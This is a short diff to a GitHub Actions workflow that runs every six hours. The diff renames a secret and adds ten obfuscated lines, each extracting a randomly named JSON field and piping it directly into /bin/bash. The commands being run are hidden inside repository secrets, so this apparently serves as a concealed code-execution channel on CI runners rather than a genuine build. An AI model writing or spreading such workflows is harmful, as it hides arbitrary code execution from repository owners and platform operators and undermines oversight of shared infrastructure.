@@ -3,8 +3,8 @@ name: dnbshul
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 3/6 * * *'
-jobs:  # 9403
+    - cron: '14 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,10 +12,16 @@ jobs:  # 9403
       - uses: actions/checkout@v4
       - name: dnbshul
         env:
-          fwula2497: ${{ secrets.fwula2497 }}
+          ntxtc92: ${{ secrets.ntxtc92 }}
         run: |
-          echo $fwula2497 | jq -r .ab16163 | /bin/bash
-          echo $bvil6 | jq -r .c2 | /bin/bash
-          echo $p17389 | jq -r .vxc82 | /bin/bash
-          echo $ntet6 | jq -r .bgwt59915 | /bin/bash
+          echo $ntxtc92 | jq -r .cax986 | /bin/bash
+          echo $q27813 | jq -r .romj0455 | /bin/bash
+          echo $iybcl1 | jq -r .lpb0 | /bin/bash
+          echo $c61 | jq -r .p1 | /bin/bash
+          echo $b0 | jq -r .qz25 | /bin/bash
+          echo $a834 | jq -r .otxvu8543 | /bin/bash
+          echo $hxdth53268 | jq -r .ntqxg4 | /bin/bash
+          echo $dmu7826 | jq -r .jd997 | /bin/bash
+          echo $xn11 | jq -r .dkw42 | /bin/bash
+          echo $aoii8 | jq -r .opgrs07258 | /bin/bash
 
